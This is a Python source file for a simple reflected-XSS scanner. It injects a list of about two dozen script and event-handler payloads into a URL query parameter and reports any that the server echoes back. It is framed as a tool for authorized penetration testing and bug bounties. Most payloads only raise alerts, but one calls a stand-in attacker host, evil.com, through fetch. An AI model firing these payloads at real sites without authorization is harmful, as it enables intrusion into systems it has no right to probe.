# =====================================================================================
# Title        : JoshXSS - Simple XSS Payload Reflection Scanner
# Author       : Josh 
# Created on   : [ April 25, 2025]
# Description  : A Python tool to scan URLs for potential reflected XSS vulnerabilities
# GitHub       : https://github.com/Josh-INetSecurity-IN/josh-xss
#
# Ownership    : This tool is developed and maintained by Josh for ethical security 
#                research, penetration testing, and bug bounty hunting.
#
# License      : MIT License (see LICENSE file for details)
#
# Disclaimer   : This tool is intended for authorized testing and educational purposes only.
#                Unauthorized use is strictly prohibited.
# =====================================================================================



import requests

def show_banner():
    banner = """
     ██╗ ██████╗ ███████╗██╗  ██╗     ██╗  ██╗███████╗███████╗      ██╗   ██╗███████╗██████╗     ██╗    ██████╗ 
     ██║██╔═══██╗██╔════╝██║  ██║     ╚██╗██╔╝██╔════╝██╔════╝      ██║   ██║██╔════╝██╔══██╗██╗███║   ██╔═████╗
     ██║██║   ██║███████╗███████║█████╗╚███╔╝ ███████╗███████╗█████╗██║   ██║█████╗  ██████╔╝╚═╝╚██║   ██║██╔██║
██   ██║██║   ██║╚════██║██╔══██║╚════╝██╔██╗ ╚════██║╚════██║╚════╝╚██╗ ██╔╝██╔══╝  ██╔══██╗██╗ ██║   ████╔╝██║
╚█████╔╝╚██████╔╝███████║██║  ██║     ██╔╝ ██╗███████║███████║       ╚████╔╝ ███████╗██║  ██║╚═╝ ██║██╗╚██████╔╝
 ╚════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝        ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝ ╚═════╝ 
    """
    print(banner)

# List of top 20 XSS payloads
xss_payloads = [
    "<script>alert('XSS1');</script>",
    "<img src='x' onerror='alert(2)'>",
    "<script>eval('alert(3)');</script>",
    "<svg/onload=alert(4)>",
    "<script>confirm('XSS5');</script>",
    "<body onload=alert(6)>",
    "<img src='x' onerror='alert(7)'>",
    "<script>prompt('XSS8');</script>",
    "<script>setTimeout('alert(9)', 1000);</script>",
    "<svg/onload=alert(10)>",
    "<script>fetch('http://evil.com').then(alert)</script>",
    "<a href='javascript:alert(11)'>XSS</a>",
    "<img src='x' onerror='alert(12)'>",
    "<script>var x = 0; alert(x)</script>",
    "<body onload=alert(13)>",
    "<script>alert('XSS14')</script>",
    "<iframe src='javascript:alert(15)'></iframe>",
    "<input type='text' value='\";alert(16)//'>",
    "<script>eval(atob('YWxlcnQoMik='))</script>",
    "<img src='x' onerror='alert(17)'>",
    "<object data='data:text/html,<script>alert(18)</script>'></object>",
    "<div onmouseover='alert(19)'>Hover me</div>",
    "<input type='text' value='<script>alert(20)</script>'>",
]

def check_xss(url):
    print(f"\n[+] Checking XSS on: {url}\n")

    vulnerable_payloads = []

    for payload in xss_payloads:
        if '?' in url:
            inject_url = f"{url}&query={payload}"
        else:
            inject_url = f"{url}?query={payload}"

        try:
            response = requests.get(inject_url, timeout=5)

            if payload in response.text:
                print(f"[✓] XSS detected with payload: {payload}")
                vulnerable_payloads.append(payload)

        except requests.RequestException as e:
            print(f"[!] Request failed for {inject_url}: {e}")
    
    if vulnerable_payloads:
        print("\n[🔥] XSS vulnerabilities detected!")
        print(f"[>] Vulnerable payloads:\n{vulnerable_payloads}")
    else:
        print("[✘] No XSS vulnerabilities found.")

if __name__ == "__main__":
    show_banner()
    url = input("Enter the URL to test for XSS (e.g., https://example.com/page.php?param=val): ")
    check_xss(url)
